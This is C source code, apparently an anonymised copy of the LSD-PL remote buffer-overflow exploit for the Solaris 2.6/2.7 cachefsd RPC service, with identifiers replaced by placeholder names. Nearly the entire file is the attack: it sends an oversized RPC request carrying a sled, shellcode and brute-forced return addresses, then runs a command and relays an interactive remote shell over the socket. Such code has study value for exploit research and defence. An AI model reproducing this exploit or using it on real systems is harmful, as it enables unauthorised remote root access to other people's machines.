
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_10__ TYPE_3__ ;
typedef struct TYPE_9__ TYPE_2__ ;
typedef struct TYPE_8__ TYPE_1__ ;


struct timeval {int member_0; int tv_sec; int member_1; } ;
struct TYPE_8__ {int s_addr; } ;
struct sockaddr_in {int sin_port; TYPE_1__ sin_addr; int sin_family; } ;
struct sockaddr {int dummy; } ;
struct hostent {int * h_addr; } ;
struct TYPE_9__ {char* dir; char* cache; } ;
typedef TYPE_2__ req_t ;
typedef int fd_set ;
typedef enum clnt_stat { ____Placeholder_clnt_stat } clnt_stat ;
struct TYPE_10__ {int cl_auth; } ;
typedef TYPE_3__ CLIENT ;


 int VAR_0 ;
 int VAR_1 ;
 int VAR_2 ;
 int VAR_3 ;
 scalar_t__ VAR_4 ;
 scalar_t__ VAR_5 ;
 scalar_t__ VAR_6 ;
 scalar_t__ FUNC_0 (int,int *) ;
 int FUNC_1 (int,int *) ;
 int VAR_7 ;
 int FUNC_2 (int *) ;
 int VAR_8 ;
 int VAR_9 ;
 int VAR_10 ;
 int VAR_11 ;
 int FUNC_3 (int ) ;
 int FUNC_4 (char*,int ,int ,int ,int *) ;
 int FUNC_5 (TYPE_3__*,int ,int ,void*,int ,int *,struct timeval) ;
 int FUNC_6 (TYPE_3__*) ;
 int FUNC_7 (char*) ;
 int FUNC_8 (TYPE_3__*,char*) ;
 TYPE_3__* FUNC_9 (struct sockaddr_in*,int ,int ,int*,int ,int ) ;
 int FUNC_10 (int) ;
 scalar_t__ VAR_12 ;
 int FUNC_11 (int) ;
 int FUNC_12 (int ) ;
 void** VAR_13 ;
 struct hostent* FUNC_13 (char*) ;
 int FUNC_14 (int,char**,char*) ;
 int FUNC_15 (int,struct sockaddr*,int*) ;
 int FUNC_16 (int) ;
 int FUNC_17 (int) ;
 int FUNC_18 (char*) ;
 int FUNC_19 (int,char,...) ;
 int FUNC_20 (char*,int *,int) ;
 int FUNC_21 (char*,int,int) ;
 int * VAR_14 ;
 int FUNC_22 (int ) ;
 int FUNC_23 (int ) ;
 int VAR_15 ;
 int FUNC_24 (char*) ;
 int FUNC_25 (char*,...) ;
 int FUNC_26 (int,char*,int) ;
 scalar_t__ FUNC_27 (int ,int *,int *,int *,int *) ;
 void** VAR_16 ;
 int VAR_17 ;
 int FUNC_28 (void**) ;
 int * VAR_18 ;
 int FUNC_29 (int,char*,int) ;
 int VAR_19 ;
 int VAR_20 ;

FUNC_30(int VAR_21,char **VAR_22){
    char VAR_23[100000],*VAR_24;
    int VAR_25,VAR_26,VAR_27,VAR_28,VAR_29,VAR_30=0,VAR_31=0,VAR_32=0,VAR_33,VAR_34=0,VAR_35=0,VAR_36=-1;
    CLIENT *VAR_37;enum clnt_stat VAR_38;
    struct hostent *VAR_39;
    struct sockaddr_in VAR_40;
    struct timeval VAR_41={10,0};
    req_t VAR_42;

    FUNC_25("copyright LAST STAGE OF DELIRIUM jan 2002 poland  //lsd-pl.net/\n");
    FUNC_25("cachefsd for solaris 2.6 2.7 sparc\n\n");

    if(VAR_21<2){
        FUNC_25("usage: %s address [-p port] [-o ofs] -v 6|7 [-b] [-m]\n",VAR_22[0]);
        FUNC_11(-1);
    }

    while((VAR_27=FUNC_14(VAR_21-1,&VAR_22[1],"p:o:v:bm"))!=-1){
        switch(VAR_27){
        case 'p': VAR_32=FUNC_3(VAR_15);break;
        case 'o': VAR_30=FUNC_3(VAR_15);break;
        case 'v': VAR_36=FUNC_3(VAR_15);break;
        case 'b': VAR_34=1;break;
 case 'm': VAR_35=1;
        }
    }

    switch(VAR_36){
    case 6: VAR_29=0xefffeb20;break;
    case 7: case 8: VAR_29=0xffbee998;break;
    default: FUNC_11(-1);
    }
    if(VAR_35) VAR_29=0xeffffa1c;
    for(VAR_26=0;VAR_26<512;VAR_26++){
        VAR_18[0]=VAR_18[1]=FUNC_16(0xfffffffe);
        VAR_18[3]=FUNC_16(VAR_29+VAR_30+VAR_31+((VAR_34)?80:0));
        VAR_18[9]=FUNC_16(VAR_29+VAR_30+VAR_31+((VAR_35)?-4136:4228));

        if(!VAR_26){
            FUNC_25("ret=0x%08x adr=0x%08x ofs=%d timeout=%d\n",
         FUNC_22(VAR_18[9]),FUNC_22(VAR_18[3]),VAR_30,
         VAR_41.tv_sec);
        }

        VAR_40.sin_family=VAR_0;
        VAR_40.sin_port=FUNC_17(VAR_32);
        if((VAR_40.sin_addr.s_addr=FUNC_18(VAR_22[1]))==-1){
            if((VAR_39=FUNC_13(VAR_22[1]))==((void*)0)){
         VAR_12=VAR_4;FUNC_24("\nerror");FUNC_11(-1);
            }
            FUNC_20(&VAR_40.sin_addr.s_addr,VAR_39->h_addr,4);
        }

        VAR_33=VAR_9;
        if(!(VAR_37=FUNC_9(&VAR_40,VAR_2,VAR_3,&VAR_33,0,0))){
            FUNC_7("\nclnttcp_create error");FUNC_11(-1);
        }
        VAR_37->cl_auth=FUNC_4("localhost",0,0,0,((void*)0));

        FUNC_21(VAR_23,0xff,60000);
        VAR_23[60000]=0;

        VAR_42.dir=VAR_23;
        VAR_42.cache="lsd";

        VAR_38=FUNC_5(VAR_37,VAR_1,VAR_19,(void*)&VAR_42,VAR_20,((void*)0),VAR_41);
        if(VAR_38!=VAR_11) {FUNC_8(VAR_37,"\nerror");FUNC_11(-1);}

        VAR_25=sizeof(struct sockaddr_in);
        if(FUNC_15(VAR_33,(struct sockaddr*)&VAR_40,&VAR_25)==-1){
            struct{unsigned int maxlen;unsigned int len;char *buf;}VAR_43;
            FUNC_19(VAR_33,(('S'<<8)|2),"sockmod");
            VAR_43.maxlen=0xffff;
            VAR_43.len=sizeof(struct sockaddr_in);
            VAR_43.buf=(char*)&VAR_40;
            FUNC_19(VAR_33,(('T'<<8)|144),&VAR_43);
        }
        VAR_28=FUNC_23(VAR_40.sin_port);

        VAR_13[14+0]=(unsigned char)((VAR_28>>8)&0xff);
        VAR_13[14+1]=(unsigned char)(VAR_28&0xff);

        FUNC_21(VAR_23,0x41,14000);
        VAR_24=VAR_23;
        for(VAR_25=0;VAR_25<VAR_8;VAR_25++) *VAR_24++=VAR_14[VAR_25%4];
        for(VAR_25=0;VAR_25<FUNC_28(VAR_13);VAR_25++) *VAR_24++=VAR_13[VAR_25];
        for(VAR_25=0;VAR_25<FUNC_28(VAR_16);VAR_25++) *VAR_24++=VAR_16[VAR_25];
        FUNC_20(&VAR_23[13920],VAR_18,40);
        VAR_23[14000]=0;

        VAR_42.dir="/var/lp";
        VAR_42.cache=VAR_23;
        VAR_38=FUNC_5(VAR_37,VAR_1,VAR_19,(void*)&VAR_42,VAR_20,((void*)0),VAR_41);
        if(VAR_38!=VAR_11) {FUNC_8(VAR_37,"\nerror");FUNC_11(-1);}
        VAR_38=FUNC_5(VAR_37,VAR_1,VAR_19,(void*)&VAR_42,VAR_20,((void*)0),VAR_41);
        if((VAR_38==VAR_11)||(VAR_38==VAR_10)){
            FUNC_6(VAR_37);FUNC_10(VAR_33);
            VAR_31=(VAR_26%2)?(-((VAR_26>>1)+1)*4):(((VAR_26>>1)+1)*4);
     FUNC_25(".");FUNC_12(VAR_17);
        }else break;
    }

    FUNC_25("OK! adr=0x%08x\n",FUNC_22(VAR_18[3]));
    FUNC_29(VAR_33,"/bin/uname -a\n",14);
    while(1){
        fd_set VAR_44;
        FUNC_2(&VAR_44);
        FUNC_1(0,&VAR_44);
        FUNC_1(VAR_33,&VAR_44);
        if(FUNC_27(VAR_7,&VAR_44,((void*)0),((void*)0),((void*)0))){
     int VAR_45;
     char VAR_46[1024];
     if(FUNC_0(0,&VAR_44)){
                if((VAR_45=FUNC_26(0,VAR_46,1024))<1){
             if(VAR_12==VAR_6||VAR_12==VAR_5) continue;
             else break;
                }
         FUNC_29(VAR_33,VAR_46,VAR_45);
            }
            if(FUNC_0(VAR_33,&VAR_44)){
                if((VAR_45=FUNC_26(VAR_33,VAR_46,1024))<1){
             if(VAR_12==VAR_6||VAR_12==VAR_5) continue;
             else break;
                }
                FUNC_29(1,VAR_46,VAR_45);
            }
        }
    }
}
